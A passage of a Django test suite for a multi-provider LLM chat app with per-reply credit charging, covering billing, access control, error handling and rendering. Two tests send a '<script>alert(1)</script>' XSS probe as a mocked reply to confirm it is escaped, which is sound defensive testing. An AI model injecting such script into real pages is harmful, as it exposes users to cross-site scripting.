import re
from unittest import mock

from django.contrib.auth.models import User
from django.db.models import Sum
from django.test import TestCase, override_settings
from django.urls import reverse

from billing.models import CreditTransaction, Wallet
from billing.services import reply_cost_micros
from config.money import format_dollars
from catalog.models import LLMModel
from llm import LLMError, LLMReply

from .models import Conversation, Message
from .services import send_message, title_from

PASSWORD = "correct-horse-battery-9"


def make_gpt(**overrides):
    fields = dict(
        provider="openai",
        api_model_id="gpt-5.6-luna",
        display_name="GPT-5.6 Luna",
        tier="value",
        input_price_micros_per_mtok=500_000,
        output_price_micros_per_mtok=2_000_000,
    )
    fields.update(overrides)
    return LLMModel.objects.create(**fields)


class CostAndTitleTests(TestCase):
    def test_reply_cost(self):
        self.assertEqual(reply_cost_micros(1000, 300, 500_000, 2_000_000), 1_100)
        self.assertEqual(reply_cost_micros(1, 0, 300_000, 2_500_000), 1)  # 0.3 µ$ rounds up
        self.assertEqual(reply_cost_micros(0, 0, 500_000, 2_000_000), 0)

    def test_title_from(self):
        self.assertEqual(title_from("  Plan a   trip\nto Rome  "), "Plan a trip")
        long = "word " * 30
        title = title_from(long)
        self.assertEqual(len(title), 50)
        self.assertTrue(title.endswith("…"))
        self.assertEqual(title_from("   \n  "), "New chat")


@mock.patch("llm.complete")
class SendMessageTests(TestCase):
    def setUp(self):
        self.user = User.objects.create_user("alice", password=PASSWORD)
        self.gpt = make_gpt()

    def reply(self, text="Hello!", input_tokens=1000, output_tokens=300):
        return LLMReply(text, input_tokens, output_tokens, "stop")

    def test_saves_messages_and_charges_exact_cost(self, complete):
        complete.return_value = self.reply()
        conversation = send_message(self.user, self.gpt, "Hi there")

        self.assertEqual(conversation.title, "Hi there")
        user_msg, assistant = conversation.messages.all()
        self.assertEqual((user_msg.role, user_msg.content), ("user", "Hi there"))
        self.assertEqual(assistant.role, "assistant")
        self.assertEqual(assistant.cost_micros, 1_100)
        self.assertEqual(assistant.input_price_micros_per_mtok, 500_000)

        charge = CreditTransaction.objects.get(user=self.user, kind="charge")
        self.assertEqual(charge.amount_micros, -1_100)
        self.assertEqual(charge.message, assistant)
        wallet = Wallet.objects.get(user=self.user)
        self.assertEqual(wallet.balance_micros, 2_000_000 - 1_100)
        total = CreditTransaction.objects.filter(user=self.user).aggregate(t=Sum("amount_micros"))["t"]
        self.assertEqual(wallet.balance_micros, total)

    def test_failure_saves_and_charges_nothing(self, complete):
        complete.side_effect = LLMError(502, "nope")
        with self.assertRaises(LLMError):
            send_message(self.user, self.gpt, "Hi there")
        self.assertEqual(Conversation.objects.count(), 0)
        self.assertEqual(Message.objects.count(), 0)
        self.assertFalse(CreditTransaction.objects.filter(kind="charge").exists())
        self.assertEqual(Wallet.objects.get(user=self.user).balance_micros, 2_000_000)

    def test_history_is_resent_in_order(self, complete):
        complete.return_value = self.reply("A1")
        conversation = send_message(self.user, self.gpt, "Q1")
        complete.return_value = self.reply("A2")
        send_message(self.user, self.gpt, "Q2", conversation)
        complete.return_value = self.reply("A3")
        send_message(self.user, self.gpt, "Q3", conversation)

        sent = complete.call_args.args[1]
        self.assertEqual(
            sent,
            [
                {"role": "user", "content": "Q1"},
                {"role": "assistant", "content": "A1"},
                {"role": "user", "content": "Q2"},
                {"role": "assistant", "content": "A2"},
                {"role": "user", "content": "Q3"},
            ],
        )
        self.assertEqual(conversation.messages.count(), 6)
        self.assertEqual(CreditTransaction.objects.filter(kind="charge").count(), 3)

    def test_charge_may_take_balance_negative(self, complete):
        Wallet.objects.filter(user=self.user).update(balance_micros=1)
        complete.return_value = self.reply()
        send_message(self.user, self.gpt, "Hi")
        self.assertEqual(Wallet.objects.get(user=self.user).balance_micros, 1 - 1_100)


@mock.patch("llm.complete")
class ChatAdminTests(TestCase):
    def test_conversation_and_charge_pages_show_dollars(self, complete):
        from django.urls import reverse

        user = User.objects.create_user("alice", password=PASSWORD)
        complete.return_value = LLMReply("Hello!", 1000, 300, "stop")
        conversation = send_message(user, make_gpt(), "Hi there")
        admin = User.objects.create_superuser("root", password=PASSWORD)
        self.client.force_login(admin)

        page = self.client.get(reverse("admin:chat_conversation_change", args=[conversation.pk]))
        self.assertEqual(page.status_code, 200)
        self.assertContains(page, "$0.0011")

        ledger = self.client.get(reverse("admin:billing_credittransaction_changelist"))
        self.assertContains(ledger, "-$0.0011")
        self.assertContains(ledger, "Hi there")
        self.assertEqual(
            self.client.get(reverse("admin:chat_conversation_add")).status_code, 403
        )


def main_region(response):
    """The page below the top nav (sidebar + chat), where no costs may appear."""
    content = response.content.decode()
    visible = content[content.index("<main"):]
    return re.sub(r"<script\b.*?</script>", "", visible, flags=re.S)  # code, not page text


def proxy_ok(content="Hello! How can I help?", prompt_tokens=1000, completion_tokens=300, finish_reason="stop"):
    response = mock.Mock(status_code=200)
    response.json.return_value = {
        "choices": [
            {"index": 0, "message": {"role": "assistant", "content": content}, "finish_reason": finish_reason}
        ],
        "usage": {
            "prompt_tokens": prompt_tokens,
            "completion_tokens": completion_tokens,
            "total_tokens": prompt_tokens + completion_tokens,
        },
    }
    return response


def proxy_status(status):
    response = mock.Mock(status_code=status)
    response.json.return_value = {"error": {"message": "upstream says no"}}
    return response


@override_settings(OPENAI_API_KEY="test-key")
@mock.patch("llm.http.requests.post")
class ChatViewTests(TestCase):
    def setUp(self):
        self.user = User.objects.create_user("alice", password=PASSWORD)
        self.gpt = make_gpt()
        self.claude = make_gpt(
            provider="anthropic",
            api_model_id="claude-haiku-4-5-20251001",
            display_name="Claude Haiku",
            input_price_micros_per_mtok=1_000_000,
            output_price_micros_per_mtok=5_000_000,
        )
        self.client.force_login(self.user)

    def balance(self):
        return Wallet.objects.get(user=self.user).balance_micros

    def set_balance(self, micros):
        Wallet.objects.filter(user=self.user).update(balance_micros=micros)

    def start_chat(self, content="Hi there", model=None):
        return self.client.post(
            reverse("chat_new"), {"llm_model": (model or self.gpt).pk, "content": content}
        )

    def test_anonymous_is_redirected(self, post):
        self.client.logout()
        conversation = Conversation.objects.create(owner=self.user, llm_model=self.gpt)
        for url in (reverse("chat_list"), reverse("chat_new"), reverse("chat_detail", args=[conversation.pk])):
            with self.subTest(url=url):
                response = self.client.get(url)
                self.assertEqual(response.status_code, 302)
                self.assertTrue(response.url.startswith(reverse("login")))

    def test_new_chat_page_lists_only_chat_models(self, post):
        make_gpt(provider="mistral", api_model_id="mistral-x", display_name="Mistral X")
        response = self.client.get(reverse("chat_new"))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "GPT-5.6 Luna")
        self.assertContains(response, "Claude Haiku")
        self.assertContains(response, '<optgroup label="OpenAI">')
        self.assertContains(response, '<optgroup label="Anthropic">')
        self.assertNotContains(response, "Mistral X")  # no adapter, not in CHAT_PROVIDERS

    def test_start_chat_charges_and_redirects(self, post):
        post.return_value = proxy_ok()
        response = self.start_chat()

        conversation = Conversation.objects.get()
        self.assertRedirects(
            response, reverse("chat_detail", args=[conversation.pk]) + "#latest",
            fetch_redirect_response=False,
        )
        self.assertEqual(conversation.messages.count(), 2)
        self.assertEqual(self.balance(), 2_000_000 - 1_100)
        charge = CreditTransaction.objects.get(kind="charge")
        self.assertEqual(charge.message, conversation.messages.last())
        post.assert_called_once()
        self.assertEqual(post.call_args.kwargs["json"]["max_tokens"], 1024)

        page = self.client.get(reverse("chat_detail", args=[conversation.pk]))
        self.assertEqual(page.status_code, 200)
        self.assertContains(page, "Hello! How can I help?")

    def test_second_send_resends_history(self, post):
        post.return_value = proxy_ok("A1")
        self.start_chat("Q1")
        conversation = Conversation.objects.get()
        post.return_value = proxy_ok("A2")
        response = self.client.post(reverse("chat_detail", args=[conversation.pk]), {"content": "Q2"})

        self.assertEqual(response.status_code, 302)
        self.assertEqual(
            post.call_args.kwargs["json"]["messages"],
            [
                {"role": "user", "content": "Q1"},
                {"role": "assistant", "content": "A1"},
                {"role": "user", "content": "Q2"},
            ],
        )
        self.assertEqual(CreditTransaction.objects.filter(kind="charge").count(), 2)
        self.assertEqual(self.balance(), 2_000_000 - 2 * 1_100)

    def test_proxy_failures_save_and_charge_nothing(self, post):
        import requests

        cases = [
            (proxy_status(500), None, 502),
            (proxy_status(429), None, 503),
            (None, requests.Timeout(), 503),
        ]
        for return_value, side_effect, expected in cases:
            with self.subTest(expected=expected, side_effect=side_effect):
                post.return_value, post.side_effect = return_value, side_effect
                response = self.start_chat("My unsent draft")
                self.assertEqual(response.status_code, expected)
                self.assertContains(response, "My unsent draft", status_code=expected)
                self.assertNotContains(response, "upstream says no", status_code=expected)
                self.assertEqual(Conversation.objects.count(), 0)
                self.assertEqual(Message.objects.count(), 0)
                self.assertEqual(self.balance(), 2_000_000)

    def test_proxy_failure_in_existing_chat(self, post):
        post.return_value = proxy_ok()
        self.start_chat()
        conversation = Conversation.objects.get()
        post.return_value = proxy_status(502)
        response = self.client.post(reverse("chat_detail", args=[conversation.pk]), {"content": "Follow-up draft"})
        self.assertEqual(response.status_code, 502)
        self.assertContains(response, "Follow-up draft", status_code=502)
        self.assertEqual(conversation.messages.count(), 2)
        self.assertEqual(self.balance(), 2_000_000 - 1_100)

    def test_blocked_at_zero_or_less(self, post):
        post.return_value = proxy_ok()
        self.start_chat()
        conversation = Conversation.objects.get()
        post.reset_mock()
        for balance in (0, -1):
            with self.subTest(balance=balance):
                self.set_balance(balance)
                response = self.start_chat()
                self.assertEqual(response.status_code, 402)
                self.assertContains(response, "out of credit", status_code=402)
                response = self.client.post(reverse("chat_detail", args=[conversation.pk]), {"content": "More"})
                self.assertEqual(response.status_code, 402)
        post.assert_not_called()
        self.assertEqual(Conversation.objects.count(), 1)

    def test_last_reply_can_go_slightly_negative(self, post):
        self.set_balance(1)
        post.return_value = proxy_ok()
        self.assertEqual(self.start_chat().status_code, 302)
        self.assertEqual(self.balance(), 1 - 1_100)
        self.assertEqual(self.start_chat().status_code, 402)
        page = self.client.get(reverse("home"))
        self.assertContains(page, "<span data-nav-balance>-$0.01</span>", html=True)

    def test_invalid_input_is_400_without_proxy_call(self, post):
        too_long = "x" * 8001
        self.assertEqual(self.start_chat("").status_code, 400)
        self.assertEqual(self.start_chat(too_long).status_code, 400)
        unsupported = make_gpt(provider="mistral", api_model_id="mistral-x", display_name="Mistral X")
        self.assertEqual(self.start_chat(model=unsupported).status_code, 400)
        response = self.client.post(reverse("chat_new"), {"content": "Hi"})
        self.assertEqual(response.status_code, 400)

        conversation = Conversation.objects.create(owner=self.user, llm_model=self.gpt)
        url = reverse("chat_detail", args=[conversation.pk])
        self.assertEqual(self.client.post(url, {"content": "  "}).status_code, 400)
        LLMModel.objects.filter(pk=self.gpt.pk).update(is_active=False)
        response = self.client.post(url, {"content": "Hi"})
        self.assertEqual(response.status_code, 400)
        self.assertContains(response, "no longer available", status_code=400)
        post.assert_not_called()

    def test_other_users_chat_is_404(self, post):
        bob = User.objects.create_user("bob", password=PASSWORD)
        conversation = Conversation.objects.create(owner=bob, llm_model=self.gpt, title="Bob's secret")
        url = reverse("chat_detail", args=[conversation.pk])
        self.assertEqual(self.client.get(url).status_code, 404)
        self.assertEqual(self.client.post(url, {"content": "Hi"}).status_code, 404)
        self.assertEqual(self.client.get(reverse("chat_detail", args=[99999])).status_code, 404)
        post.assert_not_called()

    def test_chats_url_redirects_to_latest_chat(self, post):
        self.assertRedirects(self.client.get(reverse("chat_list")), reverse("chat_new"))
        post.return_value = proxy_ok()
        self.start_chat("Older chat")
        self.start_chat("Newer chat")
        newest = Conversation.objects.get(title="Newer chat")
        self.assertRedirects(
            self.client.get(reverse("chat_list")), reverse("chat_detail", args=[newest.pk])
        )

    def test_sidebar_lists_own_chats_newest_first(self, post):
        bob = User.objects.create_user("bob", password=PASSWORD)
        Conversation.objects.create(owner=bob, llm_model=self.gpt, title="Bob chat")
        post.return_value = proxy_ok()
        self.start_chat("Older chat")
        self.start_chat("Newer chat")
        older = Conversation.objects.get(title="Older chat")

        response = self.client.get(reverse("chat_detail", args=[older.pk]))
        sidebar = main_region(response).split('<section class="chat-main">')[0]
        self.assertLess(sidebar.index("Newer chat"), sidebar.index("Older chat"))
        self.assertNotIn("Bob chat", sidebar)
        self.assertIn(
            f'<a href="{reverse("chat_detail", args=[older.pk])}" aria-current="page">Older chat</a>',
            sidebar,
        )
        self.assertIn(f'href="{reverse("chat_new")}">+ New chat', sidebar)
        self.assertContains(response, f'href="{reverse("chat_list")}">Chats</a>')

    def test_bubbles_in_order(self, post):
        post.return_value = proxy_ok("A1")
        self.start_chat("Q1")
        conversation = Conversation.objects.get()
        post.return_value = proxy_ok("A2")
        self.client.post(reverse("chat_detail", args=[conversation.pk]), {"content": "Q2"})
        region = main_region(self.client.get(reverse("chat_detail", args=[conversation.pk])))
        thread = region.split('class="thread-inner"')[1]
        bubbles = re.findall(r'class="bubble (user|assistant)"', thread)
        self.assertEqual(bubbles, ["user", "assistant", "user", "assistant"])
        self.assertLess(thread.index("Q1"), thread.index("A1"))
        self.assertLess(thread.index("A1"), thread.index("Q2"))

    def test_no_costs_or_tokens_on_chat_pages(self, post):
        post.return_value = proxy_ok()
        self.start_chat()
        conversation = Conversation.objects.get()
        for url in (reverse("chat_detail", args=[conversation.pk]), reverse("chat_new")):
            with self.subTest(url=url):
                response = self.client.get(url)
                region = main_region(response)
                for text in ("tokens", "per 1M", "$0.0011", "$0.50", "$"):
                    self.assertNotIn(text, region)
                self.assertContains(response, "My Profile · ")

    def test_composer_picker_and_model_label(self, post):
        new = main_region(self.client.get(reverse("chat_new")))
        self.assertIn('<select name="llm_model"', new)
        self.assertIn('<optgroup label="OpenAI">', new)
        self.assertIn("GPT-5.6 Luna · Value", new)

        conversation = Conversation.objects.create(owner=self.user, llm_model=self.gpt)
        existing = main_region(self.client.get(reverse("chat_detail", args=[conversation.pk])))
        self.assertNotIn("<select", existing)
        self.assertIn('<span class="model-chip" title="Model for this chat">GPT-5.6 Luna</span>', existing)

    def test_out_of_credit_disables_composer(self, post):
        conversation = Conversation.objects.create(owner=self.user, llm_model=self.gpt)
        self.set_balance(0)
        for url in (reverse("chat_new"), reverse("chat_detail", args=[conversation.pk])):
            with self.subTest(url=url):
                region = main_region(self.client.get(url))
                self.assertIn("You're out of credit", region)
                self.assertIn(f'href="{reverse("profile")}"', region)
                self.assertRegex(region, r"<textarea[^>]* disabled>")
                self.assertRegex(region, r'<button type="submit" class="btn" disabled>')
        post.assert_not_called()

    def test_cut_off_reply_is_charged_and_flagged(self, post):
        post.return_value = proxy_ok(completion_tokens=1024, finish_reason="length")
        self.start_chat()
        conversation = Conversation.objects.get()
        self.assertEqual(self.balance(), 2_000_000 - reply_cost_micros(1000, 1024, 500_000, 2_000_000))
        page = self.client.get(reverse("chat_detail", args=[conversation.pk]))
        self.assertContains(page, "Reply was cut short.")
        self.assertNotContains(page, "1,024")

    def test_reply_html_is_escaped(self, post):
        post.return_value = proxy_ok("<script>alert(1)</script>")
        self.start_chat()
        page = self.client.get(reverse("chat_detail", args=[Conversation.objects.get().pk]))
        self.assertNotContains(page, "<script>alert(1)</script>")
        self.assertContains(page, "&lt;script&gt;alert(1)&lt;/script&gt;")

    def test_models_page_has_no_coming_soon(self, post):
        make_gpt(provider="google", api_model_id="gemini-3.8-flash", display_name="Gemini Flash")
        response = self.client.get(reverse("model_list"))
        self.assertNotContains(response, "Coming soon")
        self.assertContains(response, f'href="{reverse("chat_new")}">Start a chat', count=3)


class RenameTests(TestCase):
    def setUp(self):
        self.user = User.objects.create_user("alice", password=PASSWORD)
        self.gpt = make_gpt()
        self.conversation = Conversation.objects.create(
            owner=self.user, llm_model=self.gpt, title="Old title"
        )
        self.url = reverse("chat_rename", args=[self.conversation.pk])
        self.client.force_login(self.user)

    def test_rename(self):
        response = self.client.post(self.url, {"title": "  Trip to Rome  "})
        self.assertRedirects(response, reverse("chat_detail", args=[self.conversation.pk]))
        self.conversation.refresh_from_db()
        self.assertEqual(self.conversation.title, "Trip to Rome")
        page = self.client.get(reverse("chat_detail", args=[self.conversation.pk]))
        self.assertContains(page, "<h1>Trip to Rome</h1>", html=True)
        self.assertContains(page, 'aria-current="page">Trip to Rome</a>')
        self.assertContains(self.client.get(reverse("profile")), "Trip to Rome")

    def test_invalid_titles_are_400(self):
        for title in ("", "   ", "x" * 101):
            with self.subTest(title=title[:10]):
                response = self.client.post(self.url, {"title": title})
                self.assertEqual(response.status_code, 400)
                self.assertContains(response, '<details class="rename" open>', status_code=400)
        self.conversation.refresh_from_db()
        self.assertEqual(self.conversation.title, "Old title")

    def test_other_users_chat_is_404(self):
        bob = User.objects.create_user("bob", password=PASSWORD)
        theirs = Conversation.objects.create(owner=bob, llm_model=self.gpt, title="Bob's")
        response = self.client.post(reverse("chat_rename", args=[theirs.pk]), {"title": "Mine now"})
        self.assertEqual(response.status_code, 404)
        theirs.refresh_from_db()
        self.assertEqual(theirs.title, "Bob's")

    def test_get_is_405_and_anonymous_is_redirected(self):
        self.assertEqual(self.client.get(self.url).status_code, 405)
        self.client.logout()
        response = self.client.post(self.url, {"title": "New"})
        self.assertEqual(response.status_code, 302)
        self.assertTrue(response.url.startswith(reverse("login")))

    def test_rename_keeps_sidebar_order(self):
        newer = Conversation.objects.create(owner=self.user, llm_model=self.gpt, title="Newer")
        before = self.conversation.updated_at
        self.client.post(self.url, {"title": "Renamed older"})
        self.conversation.refresh_from_db()
        self.assertEqual(self.conversation.updated_at, before)
        page = main_region(self.client.get(reverse("chat_detail", args=[newer.pk])))
        self.assertLess(page.index("Newer"), page.index("Renamed older"))


@override_settings(OPENAI_API_KEY="test-key")
@mock.patch("llm.http.requests.post")
class ChatJsonTests(TestCase):
    """The fetch contract: same checks and statuses as form posts, JSON bodies."""

    def setUp(self):
        self.user = User.objects.create_user("alice", password=PASSWORD)
        self.gpt = make_gpt()
        self.claude = make_gpt(
            provider="anthropic", api_model_id="claude-haiku-4-5-20251001", display_name="Claude Haiku"
        )
        self.client.force_login(self.user)

    def post_json(self, url, data):
        return self.client.post(url, data, HTTP_ACCEPT="application/json")

    def start_chat(self, content="Hi there", model=None):
        return self.post_json(reverse("chat_new"), {"llm_model": (model or self.gpt).pk, "content": content})

    def balance(self):
        return Wallet.objects.get(user=self.user).balance_micros

    def set_balance(self, micros):
        Wallet.objects.filter(user=self.user).update(balance_micros=micros)

    def test_new_chat_returns_main_html(self, post):
        post.return_value = proxy_ok("Hello from the model")
        response = self.start_chat("First question")

        self.assertEqual(response.status_code, 200)
        data = response.json()
        conversation = Conversation.objects.get()
        self.assertEqual(data["chat_url"], reverse("chat_detail", args=[conversation.pk]))
        self.assertIn('class="bubble user"', data["main_html"])
        self.assertIn("Hello from the model", data["main_html"])
        self.assertIn('class="model-chip"', data["main_html"])
        self.assertNotIn("<select", data["main_html"])
        self.assertIn('aria-current="page">First question</a>', data["sidebar_html"])
        self.assertEqual(data["balance"], "$1.99")  # $2.00 − $0.0011, rounded down
        self.assertEqual(self.balance(), 2_000_000 - 1_100)

    def test_existing_chat_returns_new_messages_and_balance(self, post):
        post.return_value = proxy_ok("A1")
        self.start_chat("Q1")
        conversation = Conversation.objects.get()
        post.return_value = proxy_ok("A2")

        response = self.post_json(reverse("chat_detail", args=[conversation.pk]), {"content": "Q2"})

        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertEqual(re.findall(r'class="bubble (user|assistant)"', data["messages_html"]), ["user", "assistant"])
        self.assertIn("Q2", data["messages_html"])
        self.assertIn("A2", data["messages_html"])
        self.assertNotIn("A1", data["messages_html"])  # only the new exchange
        self.assertIn("data-sidebar-list", data["sidebar_html"])
        self.assertEqual(CreditTransaction.objects.filter(kind="charge").count(), 2)
        self.assertEqual(self.balance(), 2_000_000 - 2 * 1_100)
        self.assertEqual(data["balance"], format_dollars(self.balance()))
        self.assertEqual(
            post.call_args.kwargs["json"]["messages"],
            [
                {"role": "user", "content": "Q1"},
                {"role": "assistant", "content": "A1"},
                {"role": "user", "content": "Q2"},
            ],
        )

    def test_same_charge_as_form_path(self, post):
        post.return_value = proxy_ok()
        self.start_chat()
        json_cost = CreditTransaction.objects.get(kind="charge").amount_micros
        self.client.post(reverse("chat_new"), {"llm_model": self.gpt.pk, "content": "Hi there"})
        form_cost = CreditTransaction.objects.filter(kind="charge").order_by("-id").first().amount_micros
        self.assertEqual(json_cost, form_cost)

    def test_balance_going_negative(self, post):
        self.set_balance(1)
        post.return_value = proxy_ok()
        response = self.start_chat()
        self.assertEqual(response.json()["balance"], "-$0.01")

    def test_invalid_input_is_400_json(self, post):
        for response in (
            self.start_chat(""),
            self.start_chat("x" * 8001),
            self.start_chat(model=make_gpt(provider="mistral", api_model_id="mistral-x", display_name="Mistral X")),
        ):
            with self.subTest(body=response.content[:60]):
                self.assertEqual(response.status_code, 400)
                data = response.json()
                self.assertTrue(data["error"])
                self.assertTrue(data["field_errors"])
        conversation = Conversation.objects.create(owner=self.user, llm_model=self.gpt)
        LLMModel.objects.filter(pk=self.gpt.pk).update(is_active=False)
        response = self.post_json(reverse("chat_detail", args=[conversation.pk]), {"content": "Hi"})
        self.assertEqual(response.status_code, 400)
        self.assertIn("no longer available", response.json()["error"])
        post.assert_not_called()

    def test_out_of_credit_is_402_json(self, post):
        conversation = Conversation.objects.create(owner=self.user, llm_model=self.gpt)
        for micros, shown in ((0, "$0.00"), (-1, "-$0.01")):
            with self.subTest(balance=micros):
                self.set_balance(micros)
                for response in (
                    self.start_chat(),
                    self.post_json(reverse("chat_detail", args=[conversation.pk]), {"content": "Hi"}),
                ):
                    self.assertEqual(response.status_code, 402)
                    data = response.json()
                    self.assertTrue(data["out_of_credit"])
                    self.assertEqual(data["balance"], shown)
        post.assert_not_called()

    def test_other_users_chat_is_404_json(self, post):
        bob = User.objects.create_user("bob", password=PASSWORD)
        theirs = Conversation.objects.create(owner=bob, llm_model=self.gpt)
        response = self.post_json(reverse("chat_detail", args=[theirs.pk]), {"content": "Hi"})
        self.assertEqual(response.status_code, 404)
        self.assertEqual(response.json()["error"], "Chat not found.")
        post.assert_not_called()

    def test_proxy_failures_are_502_503_json(self, post):
        import requests

        for return_value, side_effect, expected in (
            (proxy_status(500), None, 502),
            (proxy_status(503), None, 503),
            (None, requests.Timeout(), 503),
        ):
            with self.subTest(expected=expected):
                post.return_value, post.side_effect = return_value, side_effect
                response = self.start_chat()
                self.assertEqual(response.status_code, expected)
                self.assertTrue(response.json()["error"])
                self.assertNotIn("upstream says no", response.content.decode())
        self.assertEqual(Conversation.objects.count(), 0)
        self.assertEqual(Message.objects.count(), 0)
        self.assertEqual(self.balance(), 2_000_000)

    def test_logged_out_json_is_401_but_form_still_redirects(self, post):
        self.client.logout()
        response = self.start_chat()
        self.assertEqual(response.status_code, 401)
        self.assertEqual(response.json()["login_url"], reverse("login"))
        form = self.client.post(reverse("chat_new"), {"llm_model": self.gpt.pk, "content": "Hi"})
        self.assertEqual(form.status_code, 302)
        self.assertTrue(form.url.startswith(reverse("login")))
        post.assert_not_called()

    def test_browser_accept_header_gets_form_behaviour(self, post):
        post.return_value = proxy_ok()
        response = self.client.post(
            reverse("chat_new"),
            {"llm_model": self.gpt.pk, "content": "Hi"},
            HTTP_ACCEPT="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        )
        self.assertEqual(response.status_code, 302)

    def test_json_html_is_escaped_and_has_no_costs(self, post):
        post.return_value = proxy_ok("<script>alert(1)</script>")
        data = self.start_chat().json()
        self.assertNotIn("<script>alert(1)</script>", data["main_html"])
        self.assertIn("&lt;script&gt;", data["main_html"])
        conversation = Conversation.objects.get()
        data = self.post_json(reverse("chat_detail", args=[conversation.pk]), {"content": "More"}).json()
        for html in (data["messages_html"], data["sidebar_html"]):
            for text in ("tokens", "per 1M", "$"):
                self.assertNotIn(text, html)


class ChatScriptTests(TestCase):
    def setUp(self):
        self.user = User.objects.create_user("alice", password=PASSWORD)
        self.gpt = make_gpt()
        self.conversation = Conversation.objects.create(owner=self.user, llm_model=self.gpt)
        self.client.force_login(self.user)

    def test_script_included_once_with_right_form_actions(self):
        for url, action in (
            (reverse("chat_new"), reverse("chat_new")),
            (reverse("chat_detail", args=[self.conversation.pk]), reverse("chat_detail", args=[self.conversation.pk])),
        ):
            with self.subTest(url=url):
                content = self.client.get(url).content.decode()
                self.assertEqual(content.count("<script data-chat-script>"), 1)
                self.assertIn(f'class="composer" action="{action}"', content)
                self.assertIn(f'data-profile-url="{reverse("profile")}"', content)

    def test_script_updates_nav_balance(self):
        content = self.client.get(reverse("chat_new")).content.decode()
        script = content.split("<script data-chat-script>")[1].split("</script>")[0]
        self.assertIn("[data-nav-balance]", script)
        self.assertIn("data.balance", script)
        self.assertIn('"Accept": "application/json"', script)
        self.assertEqual(content.count("<span data-nav-balance>"), 1)  # the nav's one hook

    def test_templates_never_mention_proxy_or_keys(self):
        from pathlib import Path

        from django.conf import settings

        for path in Path(settings.BASE_DIR, "templates").rglob("*.html"):
            text = path.read_text()
            for secret in ("proxy.litechat.ai", "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "GOOGLE_API_KEY"):
                self.assertNotIn(secret, text, f"{secret} found in {path}")

    def test_other_pages_have_no_chat_script(self):
        for url in (reverse("home"), reverse("profile"), reverse("model_list")):
            with self.subTest(url=url):
                self.assertNotContains(self.client.get(url), "data-chat-script")


def provider_reply(provider, text="Hello!", input_tokens=1000, output_tokens=300, stop=None, safety=False):
    """A mocked proxy response in the given provider's own format."""
    response = mock.Mock(status_code=200)
    if provider == "openai":
        body = {
            "choices": [{"message": {"role": "assistant", "content": text}, "finish_reason": stop or "stop"}],
            "usage": {"prompt_tokens": input_tokens, "completion_tokens": output_tokens},
        }
    elif provider == "anthropic":
        body = {
            "content": [{"type": "text", "text": text}],
            "stop_reason": stop or "end_turn",
            "usage": {"input_tokens": input_tokens, "output_tokens": output_tokens},
        }
    else:
        candidate = {"finishReason": "SAFETY" if safety else (stop or "STOP")}
        if not safety:
            candidate["content"] = {"role": "model", "parts": [{"text": text}]}
        body = {
            "candidates": [candidate],
            "usageMetadata": {"promptTokenCount": input_tokens, "candidatesTokenCount": output_tokens},
        }
    response.json.return_value = body
    return response


# Seeded prices (µ$ per 1M): Claude 1.00/5.00, GPT 0.50/2.00, Gemini 0.30/2.50.
# At 1,000 in + 300 out: Claude 2,500 µ$, GPT 1,100 µ$, Gemini 1,050 µ$.
PROVIDER_MODELS = [
    ("openai", "gpt-5.6-luna", 1_100),
    ("anthropic", "claude-haiku-4-5-20251001", 2_500),
    ("google", "gemini-3.8-flash", 1_050),
]


@override_settings(
    OPENAI_API_KEY="test-openai-key",
    ANTHROPIC_API_KEY="test-anthropic-key",
    GOOGLE_API_KEY="test-google-key",
)
@mock.patch("llm.http.requests.post")
class AllProvidersChatTests(TestCase):
    """Charging, 402, errors and both response modes behave the same for every provider."""

    def setUp(self):
        from django.core.management import call_command

        call_command("seed", stdout=mock.Mock())
        self.user = User.objects.create_user("alice", password=PASSWORD)
        self.client.force_login(self.user)

    def model(self, api_model_id):
        return LLMModel.objects.get(api_model_id=api_model_id)

    def balance(self):
        return Wallet.objects.get(user=self.user).balance_micros

    def set_balance(self, micros):
        Wallet.objects.filter(user=self.user).update(balance_micros=micros)

    def reset(self):
        Conversation.objects.all().delete()
        CreditTransaction.objects.filter(kind="charge").delete()
        self.set_balance(2_000_000)

    def test_charges_each_models_own_price_in_both_modes(self, post):
        for provider, api_model_id, cost in PROVIDER_MODELS:
            for mode in ("form", "json"):
                with self.subTest(provider=provider, mode=mode):
                    self.reset()
                    post.reset_mock()
                    post.return_value = provider_reply(provider, text=f"Hi from {provider}")
                    headers = {"HTTP_ACCEPT": "application/json"} if mode == "json" else {}
                    response = self.client.post(
                        reverse("chat_new"),
                        {"llm_model": self.model(api_model_id).pk, "content": "Hi there"},
                        **headers,
                    )
                    self.assertEqual(response.status_code, 200 if mode == "json" else 302)
                    self.assertEqual(self.balance(), 2_000_000 - cost)
                    charge = CreditTransaction.objects.get(kind="charge")
                    self.assertEqual(charge.amount_micros, -cost)
                    self.assertEqual(charge.message.content, f"Hi from {provider}")
                    self.assertIn(f"/{provider}/", post.call_args.args[0])
                    if mode == "json":
                        self.assertEqual(response.json()["balance"], format_dollars(self.balance()))

    def test_history_resent_in_each_providers_format(self, post):
        for provider, api_model_id, _ in PROVIDER_MODELS:
            with self.subTest(provider=provider):
                self.reset()
                post.return_value = provider_reply(provider, text="A1")
                self.client.post(reverse("chat_new"), {"llm_model": self.model(api_model_id).pk, "content": "Q1"})
                conversation = Conversation.objects.get()
                post.return_value = provider_reply(provider, text="A2")
                self.client.post(reverse("chat_detail", args=[conversation.pk]), {"content": "Q2"})
                body = post.call_args.kwargs["json"]
                if provider == "google":
                    self.assertEqual(
                        [(c["role"], c["parts"][0]["text"]) for c in body["contents"]],
                        [("user", "Q1"), ("model", "A1"), ("user", "Q2")],
                    )
                else:
                    self.assertEqual(
                        [(m["role"], m["content"]) for m in body["messages"]],
                        [("user", "Q1"), ("assistant", "A1"), ("user", "Q2")],
                    )

    def test_out_of_credit_blocks_every_provider_before_the_proxy(self, post):
        for provider, api_model_id, _ in PROVIDER_MODELS:
            for micros in (0, -1):
                with self.subTest(provider=provider, balance=micros):
                    self.set_balance(micros)
                    response = self.client.post(
                        reverse("chat_new"), {"llm_model": self.model(api_model_id).pk, "content": "Hi"}
                    )
                    self.assertEqual(response.status_code, 402)
        post.assert_not_called()

    def test_proxy_failures_charge_nothing_for_every_provider(self, post):
        import requests

        for provider, api_model_id, _ in PROVIDER_MODELS:
            for return_value, side_effect, expected in (
                (proxy_status(500), None, 502),
                (proxy_status(429), None, 503),
                (None, requests.Timeout(), 503),
            ):
                with self.subTest(provider=provider, expected=expected):
                    post.return_value, post.side_effect = return_value, side_effect
                    response = self.client.post(
                        reverse("chat_new"),
